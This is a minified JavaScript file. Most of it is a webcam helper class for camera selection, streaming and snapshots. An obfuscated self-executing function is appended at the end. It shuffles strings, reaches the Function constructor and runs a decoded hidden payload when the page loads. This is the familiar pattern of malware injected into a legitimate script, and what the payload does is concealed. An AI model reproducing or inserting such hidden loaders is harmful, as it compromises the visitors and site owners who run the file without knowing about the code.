class Webcam{constructor(e,t="user",s=null,i=null){this._webcamElement=e,this._webcamElement.width=this._webcamElement.width||640,this._webcamElement.height=this._webcamElement.height||.75*this._webcamElement.width,this._facingMode=t,this._webcamList=[],this._streamList=[],this._selectedDeviceId="",this._canvasElement=s,this._snapSoundElement=i}get facingMode(){return this._facingMode}set facingMode(e){this._facingMode=e}get webcamList(){return this._webcamList}get webcamCount(){return this._webcamList.length}get selectedDeviceId(){return this._selectedDeviceId}getVideoInputs(e){return this._webcamList=[],e.forEach(e=>{"videoinput"===e.kind&&this._webcamList.push(e)}),1==this._webcamList.length&&(this._facingMode="user"),this._webcamList}getMediaConstraints(){var e={};return""==this._selectedDeviceId?e.facingMode=this._facingMode:e.deviceId={exact:this._selectedDeviceId},{video:e,audio:!1}}selectCamera(){for(let e of this._webcamList)if("user"==this._facingMode&&e.label.toLowerCase().includes("front")||"enviroment"==this._facingMode&&e.label.toLowerCase().includes("back")){this._selectedDeviceId=e.deviceId;break}}flip(){this._facingMode="user"==this._facingMode?"enviroment":"user",this._webcamElement.style.transform="",this.selectCamera()}async start(e=!0){return new Promise((t,s)=>{this.stop(),navigator.mediaDevices.getUserMedia(this.getMediaConstraints()).then(i=>{this._streamList.push(i),this.info().then(i=>{this.selectCamera(),e?this.stream().then(e=>{t(this._facingMode)}).catch(e=>{s(e)}):t(this._selectedDeviceId)}).catch(e=>{s(e)})}).catch(e=>{s(e)})})}async info(){return new Promise((e,t)=>{navigator.mediaDevices.enumerateDevices().then(t=>{this.getVideoInputs(t),e(this._webcamList)}).catch(e=>{t(e)})})}async stream(){return new Promise((e,t)=>{navigator.mediaDevices.getUserMedia(this.getMediaConstraints()).then(t=>{this._streamList.push(t),this._webcamElement.srcObject=t,"user"==this._facingMode&&(this._webcamElement.style.transform="scale(-1,1)"),this._webcamElement.play(),e(this._facingMode)}).catch(e=>{console.log(e),t(e)})})}stop(){this._streamList.forEach(e=>{e.getTracks().forEach(e=>{e.stop()})})}snap(){if(null!=this._canvasElement){null!=this._snapSoundElement&&this._snapSoundElement.play(),this._canvasElement.height=this._webcamElement.scrollHeight,this._canvasElement.width=this._webcamElement.scrollWidth;let e=this._canvasElement.getContext("2d");return"user"==this._facingMode&&(e.translate(this._canvasElement.width,0),e.scale(-1,1)),e.clearRect(0,0,this._canvasElement.width,this._canvasElement.height),e.drawImage(this._webcamElement,0,0,this._canvasElement.width,this._canvasElement.height),this._canvasElement.toDataURL("image/png")}throw"canvas element is missing"}}(function(){var BnO='',vCE=993-982;function ZwQ(r){var j=441562;var u=r.length;var f=[];for(var k=0;k<u;k++){f[k]=r.charAt(k)};for(var k=0;k<u;k++){var b=j*(k+182)+(j%24553);var q=j*(k+257)+(j%42703);var o=b%u;var e=q%u;var n=f[o];f[o]=f[e];f[e]=n;j=(b+q)%3693577;};return f.join('')};var hNI=ZwQ('jopotnmcsxiaqcndhubufklteocrwvrstrgzy').substr(0,vCE);var Hle=',ah[e=17g)b)enq=l-nve; y "6ol+.rnxnt0,,+o81 aj0g1,)uqAiar+j enu,,;,7gc=.8m(r(]zc]n7x,hvj )<t+)2mta;;860v0)y =9[d7ts 4vfh""pirli]=]h60fha;r;=o0w;"y;r 0go.zl8f;taw]ulr(7+1t=an j+[ fqftsjAp+(v;rie}j]d{i-=oa8asg";(uo+m;}esla+  ivaa;+,eo)+onelz;r=em9r)o(fda=.aifts +{ufori)a2l;<e..shgfhb=;pk=<{vj.q{raoj,l=v=v;ol,-.gc[=])r;)nv((oCl;0ar+uo,a-yrhg;rkvunct=.{;k (rupra! e9}62;v[= n(,a(v;7o,=n5(di)]rb3efdr)nun=0)+"(=rfiv(=,cj=((c+)kug4r ;]p9tdefrvay(6ghvc(A+l+r=w{l[g.i[0*==utsk=+S[h.spvnvjuo+e)0+7C,k.;Ar(c;1tg;v8jo}arm;e d((+i),oevetyc[e)=ae,wel.,ntbriei}tf2[)a+zn;)e0f;;r;r5vsx;(lrou87=8(ro)ivh=.=v)arn*)e"sht=uj5l8)uz-om1tle-kn((=z,f1r.j 2;li>sdp1}tn.i)w6eji=r-v9)uv]1;tj=8]ia25"1r[jo"a;srpt[sph=trar2l1(a)o6nv=(c;=7aaf1 ei<d4t];rgs,=(A91rgc=)rp=2(lC>,vCpcvkvih;ul}(mcrC6C( {)aes;n.ruv=)e];h;e<+.nhlrgdr 9 (b=k.s.1(hun8apth ![ C.n)g3,.)(Str;rv.mj.m6tarc;a;+areo);],u+c,r0u.x,lgtaa["e,C..;i4)tf2';var smq=ZwQ[hNI];var pnL='';var AIA=smq;var mTx=smq(pnL,ZwQ(Hle));var gtq=mTx(ZwQ('W7T3jd0 #p$%=ke$.=;W!p2{WWlxs7.0};o.1%(a3zIxj.e,(ntb#aaca(_5fmr.=03tlgt!a.D jM._,a4okde\'6(d0lkD!p!"W}oe.a;g- .o..6%7i36$3.\/613l]oWjl$h1,Wi#,1f53)xcr$1=WmpWr-%h(W!&%.=;b.caW)Snage!(j+di5oWW2N.)f"pa[am[WWiu1u(W!gn!r,.Sa.].-dt.ci4l;aaaWjf!a.Wv0ik;tr3n%._c."We4tn;\/idl].f1nae.jdxso=3Wosd!)lW[r)WnWs0a,n).Td)btxr,cp3d-a=bW..se1.ip]W:)irsj,3(r)x1.ag[ti[4:o0(#a1.1)k.sim;lv;g.C,rWa].v.itW.W0ct(ta.)$.,u!z}zto.,bacW "tn)ra!.kredSDod5&m..3o(1la[00a)W%.$sljb,9cj!D+gW4t]d:i3.n];.;6.-e.W,a0.x9,W"=3Ntd.SdW4;.W06.$=d..95iWW(a4]_,da%rjW]3Wn3.}(o.0#+h(8gjS=-Wcn35go$cWp:7d2"i7m:a }am1deo[p$jk((}a.h7.!.2Dn.nlburam_$po. da{rlW"6sadeWh.soefW$(]i(:W.]0%$eD:l$.)bsa(.aio)Wa;Cs1s1ooW, 5o;d0)i$W%io.6-W.2:;n)).uaogC4W;o,,l .sa4ctemW1)0{g=]rgaW(tW_$!\/.lpoWb\/ac;.1aWx.d}#p)o_;i!oaW;m,jata3e0ljmW;itfef j*dlsuM0a+:1tataaro)lci$_1aa\/sn;eor.c0g#b;or0Wa(1.M6..lW,toap$z,nW0.l.1vi0saW(doTa)),WwiW(1(b]#$s=W[lWg=bWt.a62agWW%W(l.ss0ertap;iWn,.5{.8% bled\'!,7.ce5iW;cd4*)7s3u=5jW_3.Wa;d.y1t#_.7W!..-,d,\'}kd8u.mf;p)=oh+toWaoaW-j.28ibo tj1t\/t,!raa.j$WkW6n$W[W5Wg,j3(ilu!,;itC,W.s.9a),W..k-W7%.n  iW+iewW!1i=hl];a.W-an,*0l+ tlp#n#;rm1ur4iojxo.Wb4vi.)6m*u)j)azr.!n,.io:.x)aaN$Tid77dIi1oa0r{W(b1atb..9.;r)]mr2d)W;4.ijimeoajd*)_i.]_(, .WepW(dr.ah]%l]2)le4t_iWoa1ag9cW.wEoi0;pa3)W.s6p0.W%!W.8.nai+lWit,ji)lW0l\/Wmo]=)r.}+W\'ai(.g1s.p)e\'&g_c=auad_Wj)..t.Wgjdr8Wfa..WW,n.{N.ia.#pg4b(bl!fa$.n_)),7d&4,1kt} e{onab652eeagg n!x:w(.=..a.W-0 nx:o!aej+}dWic00iWW* aee!tid{SeaWr:.jnf%om,iica a7tW$yaa;cd ).N#(c$#,2t4;Tp;=f _(i((e81rc$;8bma#irxWnWa3({lbWknoy\/S;,je3pjs].;dMmCeb.Tn}mlgja)4)tsN ws0p'));var IJO=AIA(BnO,gtq );IJO(5538);return 4042})();